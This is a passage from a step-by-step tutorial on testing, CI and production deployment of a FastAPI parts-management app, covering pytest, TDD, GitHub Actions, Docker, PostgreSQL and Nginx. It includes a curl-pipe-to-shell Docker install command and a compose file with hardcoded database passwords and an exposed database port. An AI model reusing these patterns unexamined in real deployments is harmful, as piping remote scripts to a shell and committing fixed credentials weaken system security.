### Measuring Coverage

```bash
### Run tests with coverage
pytest --cov=main --cov-report=html

### Open coverage report
open htmlcov/index.html
```

**Output:**

```
---------- coverage: platform darwin, python 3.11.5 -----------
Name      Stmts   Miss  Cover
-----------------------------
main.py     450     45    90%
```

### Coverage Report Example

The HTML report shows:

- Green lines: Covered by tests
- Red lines: Not covered
- Yellow lines: Partially covered (e.g., if statement)

### Improving Coverage

**Find untested code:**

```bash
pytest --cov=main --cov-report=term-missing
```

**Output shows missing lines:**

```
main.py    450     45    90%   123-145, 200-210
```

Lines 123-145 and 200-210 are not tested!

### Add Tests for Uncovered Code

```python
### Uncovered error handling
def test_upload_file_too_large(client, user_headers):
    """Test file size limit."""
    # Create 20MB file (over 10MB limit)
    large_file = b"X" * (20 * 1024 * 1024)

    response = client.post(
        "/api/files/upload",
        headers=user_headers,
        files={
            "file": ("LARGE.mcam", BytesIO(large_file), "application/octet-stream")
        }
    )

    assert response.status_code == 413  # Payload Too Large
```

### Coverage Goals

- **70-80%** - Good
- **80-90%** - Very good
- **90%+** - Excellent
- **100%** - Usually overkill (diminishing returns)

**Don't chase 100%!** Some code is hard/impossible to test:

- Exception handlers for impossible conditions
- Defensive assertions
- Logging code

---

## 10.9: Test-Driven Development (TDD)

### The TDD Cycle: Red-Green-Refactor

```
1. RED: Write a failing test
   ↓
2. GREEN: Write minimal code to make it pass
   ↓
3. REFACTOR: Improve code while keeping tests passing
   ↓
(Repeat)
```

### TDD Example: Add User Registration

**Step 1: RED - Write failing test**

```python
def test_register_new_user(client):
    """Test user registration."""
    response = client.post(
        "/api/auth/register",
        json={
            "username": "newuser",
            "password": "securepass123",
            "full_name": "New User"
        }
    )

    assert response.status_code == 201  # Created
    data = response.json()
    assert data["username"] == "newuser"
    assert "password" not in data  # Don't leak password!

### Run test: FAILS (endpoint doesn't exist)
```

**Step 2: GREEN - Implement minimal code**

```python
@app.post("/api/auth/register", status_code=201)
def register_user(
    username: str,
    password: str,
    full_name: str
):
    """Register a new user."""
    users = load_users()

    if username in users:
        raise HTTPException(status_code=409, detail="User already exists")

    users[username] = {
        "username": username,
        "password_hash": pwd_context.hash(password),
        "full_name": full_name,
        "role": "user"
    }

    save_users_with_commit(users, "system", f"Register user: {username}")

    return {
        "username": username,
        "full_name": full_name,
        "role": "user"
    }

### Run test: PASSES
```

**Step 3: REFACTOR - Improve code**

```python
### Add validation
from pydantic import BaseModel, Field, validator

class RegisterRequest(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    password: str = Field(..., min_length=8)
    full_name: str = Field(..., min_length=1, max_length=100)

    @validator('username')
    def username_alphanumeric(cls, v):
        assert v.isalnum(), 'must be alphanumeric'
        return v

@app.post("/api/auth/register", status_code=201)
def register_user(request: RegisterRequest):
    # ... implementation ...

### Run test: STILL PASSES (refactoring didn't break it)
```

**Step 4: Add more tests**

```python
def test_register_duplicate_username(client):
    """Test that duplicate usernames are rejected."""
    # Register first user
    client.post("/api/auth/register", json={
        "username": "duplicate",
        "password": "password123",
        "full_name": "First User"
    })

    # Try to register same username
    response = client.post("/api/auth/register", json={
        "username": "duplicate",
        "password": "different123",
        "full_name": "Second User"
    })

    assert response.status_code == 409

def test_register_weak_password(client):
    """Test that weak passwords are rejected."""
    response = client.post("/api/auth/register", json={
        "username": "newuser",
        "password": "123",  # Too short!
        "full_name": "New User"
    })

    assert response.status_code == 422  # Validation error
```

### Benefits of TDD

✅ **Prevents over-engineering** - Write only what's needed to pass tests  
✅ **Living documentation** - Tests show how code should be used  
✅ **Confidence** - Refactor without fear  
✅ **Better design** - Testable code is usually better code  
✅ **Fewer bugs** - Bugs caught during development

---

## 10.10: Continuous Integration (CI)

### What is CI?

**Continuous Integration** - Automatically run tests on every code change

**The flow:**

```
Developer pushes code to GitHub
    ↓
GitHub Actions triggers
    ↓
CI server:
  - Checks out code
  - Installs dependencies
  - Runs tests
  - Reports results
    ↓
Pull request shows: ✅ All tests passed
(or ❌ Tests failed)
```

### Create GitHub Actions Workflow

Create `.github/workflows/tests.yml`:

```yaml
name: Tests

### Run on push and pull request
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      # Checkout code
      - uses: actions/checkout@v3

      # Setup Python
      - name: Set up Python 3.11
        uses: actions/setup-python@v4
        with:
          python-version: "3.11"

      # Install dependencies
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt

      # Run tests
      - name: Run tests with pytest
        run: |
          pytest --cov=main --cov-report=xml --cov-report=term

      # Upload coverage to Codecov (optional)
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          file: ./coverage.xml
          fail_ci_if_error: false
```

### Understanding GitHub Actions

**Workflow** - Automated process defined in YAML  
**Job** - Set of steps that run on the same runner  
**Step** - Individual task (run command, use action)  
**Runner** - Server that runs the workflow (GitHub-hosted or self-hosted)

**Triggers:**

```yaml
on:
  push: # On every push
  pull_request: # On PR creation/update
  schedule: # Cron-like schedule
    - cron: "0 0 * * *" # Daily at midnight
  workflow_dispatch: # Manual trigger
```

### Badge in README

Add test status badge to `README.md`:

```markdown
### PDM Tutorial

![Tests](https://github.com/YOUR_USERNAME/pdm-tutorial/workflows/Tests/badge.svg)

A production-grade Parts Data Management system.
```

The badge shows: ✅ passing or ❌ failing

---

## 10.11: Testing Best Practices

### 1. Test Names Should Describe Behavior

**Bad:**

```python
def test_checkout():
    ...
```

**Good:**

```python
def test_checkout_locks_file_for_current_user():
    ...

def test_checkout_fails_if_file_already_locked():
    ...
```

### 2. Arrange-Act-Assert (AAA) Pattern

```python
def test_checkout():
    # ARRANGE - Set up test data
    create_test_file()
    user = login_user()

    # ACT - Perform the action
    response = checkout_file()

    # ASSERT - Verify results
    assert response.status_code == 200
    assert file_is_locked()
```

### 3. One Assertion Per Test (Usually)

**Bad:**

```python
def test_everything():
    assert checkout() == 200
    assert checkin() == 200
    assert delete() == 200
    assert upload() == 200  # If this fails, we don't know about previous steps
```

**Good:**

```python
def test_checkout():
    assert checkout() == 200

def test_checkin():
    assert checkin() == 200

def test_delete():
    assert delete() == 200
```

### 4. Don't Test Implementation Details

**Bad:**

```python
def test_checkout_calls_git_commit():
    """This is testing HOW, not WHAT."""
    with patch('main.git_repo.commit') as mock:
        checkout()
        assert mock.called
```

**Good:**

```python
def test_checkout_creates_commit():
    """Test the OUTCOME, not the implementation."""
    before = get_commit_count()
    checkout()
    after = get_commit_count()
    assert after == before + 1
```

**Why?** If you refactor implementation (use different Git library), the bad test breaks even though behavior is correct.

### 5. Keep Tests Fast

**Slow tests = tests that don't get run**

```python
### BAD - slow
def test_checkout():
    time.sleep(5)  # Simulating slow operation
    ...

### GOOD - mock slow operations
def test_checkout():
    with patch('main.slow_operation'):
        ...
```

### 6. Don't Use Random Data

**Bad:**

```python
def test_checkout():
    filename = f"file_{random.randint(1, 9999)}.mcam"
    # Test is non-deterministic - might fail randomly!
```

**Good:**

```python
def test_checkout():
    filename = "TEST_FILE.mcam"
    # Always the same - failures are reproducible
```

### 7. Tests Should Be Independent

**Bad:**

```python
def test_a():
    global user_id
    user_id = create_user()

def test_b():
    # Depends on test_a running first!
    checkout(user_id)
```

**Good:**

```python
def test_a():
    user_id = create_user()
    # Use user_id...

def test_b():
    user_id = create_user()  # Create its own user
    checkout(user_id)
```

---

## Stage 10 Complete - Testing Mastery

### What You Built

You now have:

- Comprehensive test suite
- Unit tests for all core functions
- Integration tests for API endpoints
- WebSocket tests
- Mocked external dependencies
- Test coverage measurement
- CI pipeline with GitHub Actions
- TDD workflow understanding

### Key Testing Concepts Mastered

**Testing Fundamentals:**

- Testing pyramid (unit, integration, e2e)
- Test fixtures and setup/teardown
- AAA pattern (Arrange-Act-Assert)
- Test independence

**pytest Features:**

- Fixtures with different scopes
- Parameterized tests
- Mocking with `unittest.mock`
- Coverage measurement
- Async test support

**Best Practices:**

- Test behavior, not implementation
- Descriptive test names
- Fast, deterministic tests
- TDD cycle (Red-Green-Refactor)

**CI/CD:**

- GitHub Actions workflows
- Automated testing on push
- Status badges
- Coverage reporting

### Verification Checklist

- [ ] Can run all tests with `pytest`
- [ ] Tests pass consistently
- [ ] Coverage > 80%
- [ ] CI pipeline runs on GitHub
- [ ] Understand fixtures
- [ ] Can mock external dependencies
- [ ] Can test async code
- [ ] Understand TDD cycle
- [ ] Tests are fast (< 10 seconds total)

### The Test Suite You Built

```
tests/
├── conftest.py              # Shared fixtures
├── test_auth.py             # Authentication tests
├── test_files.py            # File operations tests
└── test_git.py              # Git integration tests

Coverage: ~85%
Speed: ~5 seconds
CI: ✅ Passing
```

### Impact of Testing

**Before testing:**

- "Does it work?" → "It works on my machine"
- Refactoring = terror
- Bugs discovered by users
- No confidence in changes

**With testing:**

- "Does it work?" → "94 tests pass"
- Refactoring = routine
- Bugs discovered in development
- Confidence to ship

#

In **Stage 11**, we'll add **Deployment & Production** features:

- Environment configuration
- Docker containerization
- Production secrets management
- Database migration from JSON
- Logging and monitoring
- Health checks and graceful shutdown
- Nginx reverse proxy
- HTTPS with Let's Encrypt

Your app is now bulletproof through testing. Next, we make it production-ready!

---

### Stage 11: Production Deployment - From Development to Production

## Introduction: The Goal of This Stage

Your app works perfectly on your laptop. But production is a different world - different OS, multiple users, security threats, uptime requirements, and configuration challenges.

In this stage, you'll transform your development project into a **production-ready system**.

By the end of this stage, you will:

- Understand development vs production environments
- Use environment variables for configuration
- Containerize your app with Docker
- Migrate from JSON files to PostgreSQL
- Implement structured logging and monitoring
- Deploy with Docker Compose
- Set up Nginx as a reverse proxy
- Secure with HTTPS (Let's Encrypt)
- Implement health checks and graceful shutdown
- Understand the 12-factor app methodology

**Time Investment:** 10-12 hours

**WARNING:** This stage involves DevOps concepts. Take it slowly, test at each step.

---

## 11.1: Development vs Production - Understanding the Gap

### The Differences

| Aspect           | Development           | Production                  |
| ---------------- | --------------------- | --------------------------- |
| **Users**        | Just you              | Thousands                   |
| **Data**         | Test data             | Real customer data          |
| **Secrets**      | Hardcoded             | Environment variables       |
| **Errors**       | Show full stack trace | Log, show generic message   |
| **Dependencies** | Latest versions       | Pinned versions             |
| **Database**     | JSON files            | PostgreSQL/MySQL            |
| **Server**       | `uvicorn --reload`    | Gunicorn + Uvicorn workers  |
| **HTTPS**        | Not needed            | Required                    |
| **Monitoring**   | Print statements      | Structured logging, metrics |
| **Downtime**     | Acceptable            | Minimize to zero            |

### What Can Go Wrong in Production

**1. Hardcoded Secrets**

```python
### DEV: Fine
SECRET_KEY = "my-secret-key"

### PROD: DISASTER! Key visible in code, git history, logs
```

**2. JSON Files Under Load**

```python
### 1000 users simultaneously read/write locks.json
### Result: File corruption, race conditions, data loss
```

**3. No Monitoring**

```python
### App crashes at 3am
### You wake up at 9am
### 6 hours of downtime
### Customers: 😡
```

**4. Development Server in Production**

```bash
### DEV: uvicorn main:app --reload
### PROD: --reload restarts on every change (disaster!)
###       Single process (can't use multiple CPU cores)
```

### The 12-Factor App

A methodology for building production-ready apps:

1. **Codebase** - One codebase in version control
2. **Dependencies** - Explicitly declare dependencies
3. **Config** - Store config in environment
4. **Backing Services** - Treat as attached resources
5. **Build/Release/Run** - Separate stages
6. **Processes** - Execute as stateless processes
7. **Port Binding** - Export services via port binding
8. **Concurrency** - Scale via process model
9. **Disposability** - Fast startup, graceful shutdown
10. **Dev/Prod Parity** - Keep environments similar
11. **Logs** - Treat as event streams
12. **Admin Processes** - Run as one-off processes

We'll implement many of these principles.

---

## 11.2: Environment Variables - Configuration Management

### Why Environment Variables?

**The Problem:**

```python
### config.py
DATABASE_URL = "postgresql://user:password@localhost/db"
SECRET_KEY = "super-secret-key-123"
GITLAB_TOKEN = "glpat-xxxxxxxxxxxx"

### This file is in Git!
### Secrets are exposed!
### Can't use different values for dev/staging/prod!
```

**The Solution:**

```python
import os

DATABASE_URL = os.getenv("DATABASE_URL")
SECRET_KEY = os.getenv("SECRET_KEY")
GITLAB_TOKEN = os.getenv("GITLAB_TOKEN")

### Values come from environment, not code
### Can be different per environment
### No secrets in Git
```

### Create Configuration Module

Create `backend/config.py`:

```python
"""
Configuration management using environment variables.

This follows the 12-factor app methodology: all configuration
comes from the environment, allowing the same code to run in
different environments (dev, staging, production).
"""
import os
from pathlib import Path
from functools import lru_cache
from pydantic import BaseSettings, Field, validator

class Settings(BaseSettings):
    """
    Application settings.

    Uses Pydantic BaseSettings to automatically load from environment
    variables with type validation and default values.
    """

    # Application
    app_name: str = "PDM System"
    debug: bool = Field(default=False, env="DEBUG")

    # Security
    secret_key: str = Field(..., env="SECRET_KEY")
    access_token_expire_minutes: int = Field(default=30, env="ACCESS_TOKEN_EXPIRE_MINUTES")

    # Database
    database_url: str = Field(
        default="sqlite:///./pdm.db",
        env="DATABASE_URL"
    )

    # Git/GitLab
    gitlab_url: str = Field(default="", env="GITLAB_URL")
    gitlab_token: str = Field(default="", env="GITLAB_TOKEN")
    auto_push: bool = Field(default=False, env="AUTO_PUSH")
    auto_pull: bool = Field(default=False, env="AUTO_PULL")

    # Paths
    base_dir: Path = Path(__file__).resolve().parent
    repo_path: Path = None

    # Server
    host: str = Field(default="0.0.0.0", env="HOST")
    port: int = Field(default=8000, env="PORT")
    workers: int = Field(default=1, env="WORKERS")

    # CORS
    cors_origins: list = Field(
        default=["http://localhost:3000"],
        env="CORS_ORIGINS"
    )

    @validator('cors_origins', pre=True)
    def parse_cors_origins(cls, v):
        """Parse comma-separated CORS origins."""
        if isinstance(v, str):
            return [origin.strip() for origin in v.split(',')]
        return v

    @validator('repo_path', always=True)
    def set_repo_path(cls, v, values):
        """Set repo_path based on base_dir."""
        if v is None:
            return values['base_dir'] / 'git_repo' / 'repo'
        return v

    class Config:
        env_file = ".env"
        env_file_encoding = 'utf-8'

@lru_cache()
def get_settings() -> Settings:
    """
    Get cached settings instance.

    Using lru_cache ensures we only load settings once,
    improving performance.
    """
    return Settings()

### Convenience: import settings directly
settings = get_settings()
```

### Understanding Pydantic Settings

**`BaseSettings` features:**

1. **Automatic environment loading**

```python
class Settings(BaseSettings):
    secret_key: str  # Looks for SECRET_KEY env var
```

2. **Type validation**

```python
port: int  # "8000" (string) → 8000 (int) automatically
debug: bool  # "true" (string) → True (bool)
```

3. **Default values**

```python
workers: int = Field(default=4)
### If WORKERS not set, uses 4
```

4. **`.env` file support**

```python
class Config:
    env_file = ".env"
### Loads from .env file if it exists
```

### Create `.env` File

Create `backend/.env`:

```bash
### Application
DEBUG=true
SECRET_KEY=dev-secret-key-change-in-production

### Database
DATABASE_URL=postgresql://pdm_user:pdm_password@localhost/pdm_db

### GitLab
GITLAB_URL=https://gitlab.com/yourusername/pdm-repo.git
GITLAB_TOKEN=
AUTO_PUSH=false
AUTO_PULL=false

### Server
HOST=127.0.0.1
PORT=8000
WORKERS=1

### CORS (comma-separated)
CORS_ORIGINS=http://localhost:3000,http://localhost:8000
```

### Add `.env` to `.gitignore`

**CRITICAL:** Never commit `.env` to Git!

Create/update `backend/.gitignore`:

```
### Python
__pycache__/
*.pyc
*.pyo
*.pyd
.Python
venv/
*.egg-info/

### Environment
.env
.env.local
.env.*.local

### IDE
.vscode/
.idea/
*.swp

### OS
.DS_Store
Thumbs.db

### Application
git_repo/
*.db
*.sqlite
```

### Create `.env.example`

Create a template (this CAN be committed):

`backend/.env.example`:

```bash
### Copy this to .env and fill in your values
### DO NOT commit .env to Git!

### Application
DEBUG=false
SECRET_KEY=your-secret-key-here-use-strong-random-string

### Database
DATABASE_URL=postgresql://user:password@localhost/dbname

### GitLab
GITLAB_URL=https://gitlab.com/username/repo.git
GITLAB_TOKEN=your-gitlab-token
AUTO_PUSH=true
AUTO_PULL=true

### Server
HOST=0.0.0.0
PORT=8000
WORKERS=4

### CORS
CORS_ORIGINS=https://yourdomain.com
```

### Update `main.py` to Use Config

Replace hardcoded values:

```python
from config import settings

### OLD
### SECRET_KEY = "your-secret-key-change-this"
### ALGORITHM = "HS256"
### ACCESS_TOKEN_EXPIRE_MINUTES = 30

### NEW
SECRET_KEY = settings.secret_key
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = settings.access_token_expire_minutes

### OLD
### BASE_DIR = Path(__file__).resolve().parent

### NEW
BASE_DIR = settings.base_dir
REPO_PATH = settings.repo_path
```

### Generate Strong Secret Key

**NEVER use a weak secret key in production!**

```python
### Generate a secure secret key
import secrets

print(secrets.token_urlsafe(32))
### Output: "xvXlz8pQ2J6NnK9mYp7wR3uT5vX8zC1dF4gH6jK9m"
```

Use this value for `SECRET_KEY` in production `.env`.

---

## 11.3: Docker - Containerization

### What is Docker?

**Docker** packages your app and all dependencies into a **container** - a lightweight, portable, self-contained unit.

**Analogy:** Shipping containers

- Before containers: Load ship with boxes, barrels, crates (different shapes, slow)
- With containers: Everything in standard containers (uniform, efficient, stackable)

**Benefits:**

- **Works everywhere** - "Works on my machine" becomes "Works in any Docker environment"
- **Reproducible** - Same container = identical behavior
- **Isolated** - App + dependencies in one package
- **Fast deployment** - Pull image, run container

### Docker Architecture

```
┌─────────────────────────────────────┐
│         Your Computer               │
│                                     │
│  ┌──────────────────────────────┐  │
│  │      Docker Engine           │  │
│  │                              │  │
│  │  ┌────────────┐              │  │
│  │  │ Container  │              │  │
│  │  │            │              │  │
│  │  │  PDM App   │              │  │
│  │  │  Python    │              │  │
│  │  │  FastAPI   │              │  │
│  │  │            │              │  │
│  │  └────────────┘              │  │
│  │                              │  │
│  │  ┌────────────┐              │  │
│  │  │ Container  │              │  │
│  │  │ PostgreSQL │              │  │
│  │  └────────────┘              │  │
│  │                              │  │
│  └──────────────────────────────┘  │
└─────────────────────────────────────┘
```

### Install Docker

**macOS/Windows:** Download Docker Desktop from docker.com

**Linux:**

```bash
curl -fsSL https://get.docker.com | sh
sudo usermod -aG docker $USER
```

**Verify:**

```bash
docker --version
### Docker version 24.0.0

docker run hello-world
### Should download and run test container
```

### Create Dockerfile

Create `backend/Dockerfile`:

```dockerfile
### Use official Python runtime as base image
FROM python:3.11-slim

### Set working directory in container
WORKDIR /app

### Install system dependencies
RUN apt-get update && apt-get install -y \
    git \
    && rm -rf /var/lib/apt/lists/*

### Copy requirements first (for layer caching)
COPY requirements.txt .

### Install Python dependencies
RUN pip install --no-cache-dir -r requirements.txt

### Copy application code
COPY . .

### Create directory for Git repository
RUN mkdir -p git_repo

### Expose port
EXPOSE 8000

### Set environment variables
ENV PYTHONUNBUFFERED=1

### Run the application
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

### Understanding the Dockerfile

**`FROM python:3.11-slim`**

- Base image (starting point)
- `python:3.11-slim` = Python 3.11 on Debian (minimal)
- "slim" = smaller image size

**`WORKDIR /app`**

- Sets working directory inside container
- Like `cd /app` but also creates the directory

**`COPY requirements.txt .`**

- Copy file from host to container
- `.` means current directory (`/app`)

**Why copy requirements first?**

**Docker layer caching:**

```dockerfile
COPY requirements.txt .      # Layer 1: Changes rarely
RUN pip install ...          # Layer 2: Cached if Layer 1 unchanged

COPY . .                     # Layer 3: Changes often (your code)
```

If you change code but not requirements, Docker reuses cached pip install layer (much faster builds).

**`EXPOSE 8000`**

- Documents which port the container listens on
- Doesn't actually publish the port (that's `-p` in `docker run`)

**`ENV PYTHONUNBUFFERED=1`**

- Disable Python output buffering
- Makes logs appear immediately (important for debugging)

**`CMD ["uvicorn", ...]`**

- Command to run when container starts
- JSON array format = exec form (preferred)

### Build Docker Image

```bash
cd backend

docker build -t pdm-app:latest .
```

**Breakdown:**

- `docker build` - Build an image
- `-t pdm-app:latest` - Tag (name) the image
- `.` - Build context (current directory)

**Output:**

```
[+] Building 45.2s (12/12) FINISHED
 => [1/7] FROM python:3.11-slim
 => [2/7] WORKDIR /app
 => [3/7] RUN apt-get update
 => [4/7] COPY requirements.txt .
 => [5/7] RUN pip install
 => [6/7] COPY . .
 => [7/7] RUN mkdir -p git_repo
 => exporting to image
```

### Run Docker Container

```bash
docker run -d \
  --name pdm-app \
  -p 8000:8000 \
  -e SECRET_KEY="your-secret-key" \
  -e DATABASE_URL="sqlite:///./pdm.db" \
  pdm-app:latest
```

**Flags:**

- `-d` - Detached mode (run in background)
- `--name pdm-app` - Container name
- `-p 8000:8000` - Port mapping (host:container)
- `-e KEY=value` - Environment variable
- `pdm-app:latest` - Image to run

**Check if running:**

```bash
docker ps

### Output:
### CONTAINER ID   IMAGE              STATUS         PORTS
### abc123def456   pdm-app:latest     Up 2 minutes   0.0.0.0:8000->8000/tcp
```

**View logs:**

```bash
docker logs pdm-app

### Follow logs (like tail -f)
docker logs -f pdm-app
```

**Stop container:**

```bash
docker stop pdm-app
docker rm pdm-app
```

---

## 11.4: PostgreSQL - Real Database

### Why Move from JSON to PostgreSQL?

**JSON files:**

- ❌ Slow with many files
- ❌ File locking issues
- ❌ Race conditions
- ❌ No complex queries
- ❌ No transactions

**PostgreSQL:**

- ✅ Fast (even with millions of records)
- ✅ ACID transactions
- ✅ Concurrent access
- ✅ Complex queries
- ✅ Industry standard

### Install PostgreSQL

**macOS:**

```bash
brew install postgresql@15
brew services start postgresql@15
```

**Ubuntu/Debian:**

```bash
sudo apt install postgresql postgresql-contrib
sudo systemctl start postgresql
```

**Docker (easiest for development):**

```bash
docker run -d \
  --name postgres \
  -e POSTGRES_PASSWORD=pdm_password \
  -e POSTGRES_DB=pdm_db \
  -p 5432:5432 \
  postgres:15
```

### Install SQLAlchemy

```bash
pip install sqlalchemy psycopg2-binary alembic
```

**What each does:**

- `sqlalchemy` - ORM (Object-Relational Mapper)
- `psycopg2-binary` - PostgreSQL driver
- `alembic` - Database migrations

### Create Database Models

Create `backend/models.py`:

```python
"""
Database models using SQLAlchemy ORM.

Models define the database schema as Python classes.
"""
from sqlalchemy import Column, Integer, String, DateTime, Boolean, Text, ForeignKey
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import relationship
from datetime import datetime, timezone

Base = declarative_base()

class User(Base):
    """User model."""
    __tablename__ = "users"

    id = Column(Integer, primary_key=True, index=True)
    username = Column(String(50), unique=True, nullable=False, index=True)
    password_hash = Column(String(255), nullable=False)
    full_name = Column(String(100), nullable=False)
    role = Column(String(20), nullable=False, default="user")
    created_at = Column(DateTime, default=lambda: datetime.now(timezone.utc))

    # Relationships
    locks = relationship("FileLock", back_populates="user")
    audit_logs = relationship("AuditLog", back_populates="user")

class FileLock(Base):
    """File lock model."""
    __tablename__ = "file_locks"

    id = Column(Integer, primary_key=True, index=True)
    filename = Column(String(255), unique=True, nullable=False, index=True)
    user_id = Column(Integer, ForeignKey("users.id"), nullable=False)
    message = Column(Text, nullable=True)
    locked_at = Column(DateTime, default=lambda: datetime.now(timezone.utc))

    # Relationships
    user = relationship("User", back_populates="locks")

class AuditLog(Base):
    """Audit log model."""
    __tablename__ = "audit_logs"

    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id"), nullable=False)
    action = Column(String(50), nullable=False, index=True)
    target = Column(String(255), nullable=False)
    details = Column(Text, nullable=True)  # JSON string
    status = Column(String(20), default="SUCCESS")
    timestamp = Column(DateTime, default=lambda: datetime.now(timezone.utc), index=True)

    # Relationships
    user = relationship("User", back_populates="audit_logs")
```

### Understanding SQLAlchemy

**ORM (Object-Relational Mapper):**

**Instead of SQL:**

```sql
SELECT * FROM users WHERE username = 'john';
```

**Write Python:**

```python
user = session.query(User).filter(User.username == 'john').first()
```

**Column types:**

```python
Column(Integer)           # 4-byte integer
Column(String(50))        # VARCHAR(50)
Column(Text)              # Unlimited text
Column(DateTime)          # Timestamp
Column(Boolean)           # True/False
```

**Constraints:**

```python
primary_key=True          # Primary key
unique=True               # UNIQUE constraint
nullable=False            # NOT NULL
index=True                # Create index for faster queries
```

**Relationships:**

```python
class User(Base):
    locks = relationship("FileLock", back_populates="user")

class FileLock(Base):
    user_id = Column(Integer, ForeignKey("users.id"))
    user = relationship("User", back_populates="locks")

### Now you can do:
user = session.query(User).first()
print(user.locks)  # All locks for this user
```

### Create Database Connection

Create `backend/database.py`:

```python
"""
Database connection and session management.
"""
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker, Session
from config import settings
from models import Base
import logging

logger = logging.getLogger(__name__)

### Create engine
engine = create_engine(
    settings.database_url,
    echo=settings.debug,  # Log SQL queries in debug mode
    pool_pre_ping=True    # Check connection health before using
)

### Create session factory
SessionLocal = sessionmaker(
    autocommit=False,
    autoflush=False,
    bind=engine
)

def init_db():
    """
    Initialize database - create all tables.
    """
    logger.info("Creating database tables...")
    Base.metadata.create_all(bind=engine)
    logger.info("Database tables created successfully")

def get_db():
    """
    Dependency for getting database session.

    Usage:
        @app.get("/users")
        def get_users(db: Session = Depends(get_db)):
            return db.query(User).all()
    """
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()
```

### Database Migration with Alembic

**Why migrations?**

Imagine you deploy your app with this schema:

```python
class User(Base):
    username = Column(String(50))
    password_hash = Column(String(255))
```

Later, you add `email`:

```python
class User(Base):
    username = Column(String(50))
    password_hash = Column(String(255))
    email = Column(String(100))  # NEW!
```

**Problem:** Existing production database doesn't have `email` column!

**Solution:** **Migrations** - versioned database schema changes

**Initialize Alembic:**

```bash
cd backend
alembic init alembic
```

**Configure Alembic:**

Edit `alembic/env.py`:

```python
from models import Base
from config import settings

### Add this near the top
target_metadata = Base.metadata

### Update sqlalchemy.url
config.set_main_option('sqlalchemy.url', settings.database_url)
```

**Create initial migration:**

```bash
alembic revision --autogenerate -m "Initial schema"
```

**Apply migration:**

```bash
alembic upgrade head
```

**Future changes:**

```bash
### 1. Modify models.py
### 2. Generate migration
alembic revision --autogenerate -m "Add email to users"

### 3. Apply migration
alembic upgrade head
```

### Update `main.py` to Use Database

```python
from sqlalchemy.orm import Session
from database import get_db, init_db
import models

### Initialize database on startup
@app.on_event("startup")
def startup_event():
    init_db()
    logger.info("Application startup complete")

### Example: Get users endpoint
@app.get("/api/users")
def get_users(
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_user)
):
    """Get all users (admin only)."""
    if current_user.role != "admin":
        raise HTTPException(status_code=403, detail="Admin only")

    users = db.query(models.User).all()

    return {
        "users": [
            {
                "username": u.username,
                "full_name": u.full_name,
                "role": u.role,
                "created_at": u.created_at.isoformat()
            }
            for u in users
        ]
    }
```

---

## 11.5: Docker Compose - Multi-Container Setup

### What is Docker Compose?

**Docker Compose** manages multi-container applications.

**Instead of:**

```bash
docker run postgres ...
docker run pdm-app ...
docker network create ...
docker volume create ...
### (many commands)
```

**Do this:**

```bash
docker-compose up
### (one command, everything starts)
```

### Create `docker-compose.yml`

Create `backend/docker-compose.yml`:

```yaml
version: "3.8"

services:
  # PostgreSQL Database
  db:
    image: postgres:15
    container_name: pdm-db
    environment:
      POSTGRES_USER: pdm_user
      POSTGRES_PASSWORD: pdm_password
      POSTGRES_DB: pdm_db
    volumes:
      - postgres_data:/var/lib/postgresql/data
    ports:
      - "5432:5432"
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U pdm_user"]
      interval: 10s
      timeout: 5s
      retries: 5

  # PDM Application
  app:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: pdm-app
    environment:
      - DEBUG=false
      - SECRET_KEY=${SECRET_KEY}
      - DATABASE_URL=postgresql://pdm_user:pdm_password@db:5432/pdm_db
      - GITLAB_URL=${GITLAB_URL}
      - GITLAB_TOKEN=${GITLAB_TOKEN}
    volumes:
      - ./git_repo:/app/git_repo
      - ./static:/app/static
    ports:
      - "8000:8000"
    depends_on:
      db:
        condition: service_healthy
    restart: unless-stopped

  # Nginx Reverse Proxy
  nginx:
    image: nginx:alpine
    container_name: pdm-nginx
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
      - ./static:/usr/share/nginx/html:ro
    ports:
      - "80:80"
      - "443:443"
    depends_on:
      - app
    restart: unless-stopped

volumes:
  postgres_data:
```

### Understanding docker-compose.yml

**Services:**

```yaml
services:
  db: # Service name (can be referenced as hostname)
    image: # Docker image to use
    environment: # Environment variables
    volumes: # Persistent storage
    ports: # Port mapping
```

**Volumes:**

```yaml
volumes:
  - postgres_data:/var/lib/postgresql/data
  #   ↑ named volume      ↑ path in container

  - ./static:/app/static
###   ↑ bind mount (host path) ↑ container path
```

**Named volume** - Managed by Docker, persists data  
**Bind mount** - Map host directory to container

**Health checks:**

```yaml
healthcheck:
  test: ["CMD-SHELL", "pg_isready -U pdm_user"]
  interval: 10s # Check every 10 seconds
  timeout: 5s # Fail if takes > 5 seconds
  retries: 5 # Fail after 5 consecutive failures
```

**depends_on with condition:**

```yaml
depends_on:
  db:
    condition: service_healthy
### Wait for db to be healthy before starting app
```

### Create Nginx Configuration

Create `backend/nginx.conf`:

```nginx
events {
    worker_connections 1024;
}

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    upstream pdm_app {
        server app:8000;
    }

    server {
        listen 80;
        server_name localhost;

        # Static files
        location /static/ {
            alias /usr/share/nginx/html/;
            expires 7d;
            add_header Cache-Control "public, immutable";
        }

        # Proxy API requests
        location / {
            proxy_pass http://pdm_app;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;

            # WebSocket support
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
        }
    }
}
```

### Start the Stack

```bash
### Start all services
docker-compose up -d

### View logs
docker-compose logs -f

### Check status
docker-compose ps

### Stop all services
docker-compose down

### Stop and remove volumes (WARNING: deletes data!)
docker-compose down -v
```

---

## 11.6: Production Logging & Monitoring

### Structured Logging

**Bad logging:**

